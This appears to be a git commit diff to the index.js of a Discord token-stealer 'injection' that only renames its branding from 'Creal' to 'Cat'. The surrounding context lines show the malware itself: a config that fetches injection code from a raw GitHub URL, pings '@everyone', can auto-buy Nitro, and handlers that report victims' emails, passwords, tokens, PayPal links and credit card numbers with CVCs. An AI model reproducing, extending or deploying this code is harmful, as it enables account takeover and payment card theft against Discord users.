8bcb671e075bcc500f4ca23feaaf4f982967d0e4
chatnoir69 <128902057+chatnoir69@users.noreply.github.com>
2023-03-25 11:16:43 +0000

    Update index.js

--- index.js
+++ index.js
@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Creal Injection', 
+  embed_name: 'Cat Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/chatnoir69/injection/main/index.js', 
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Creal Inject - ChatNoir#2230',
+          text: '🎉・Cat Inject - ChatNoir#2230',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Creal Inject - ChatNoir#2230',
+          text: '🎉・Cat Inject - ChatNoir#2230',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Creal Inject - ChatNoir#2230',
+          text: '🎉・Cat Inject - ChatNoir#2230',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Creal Inject - ChatNoir#2230',
+          text: '🎉・Cat Inject - ChatNoir#2230',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Creal Inject - ChatNoir#2230',
+          text: '🎉・Cat Inject - ChatNoir#2230',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Creal Inject - ChatNoir#2230',
+          text: '🎉・Cat Inject - ChatNoir#2230',
         },
       },
     ],
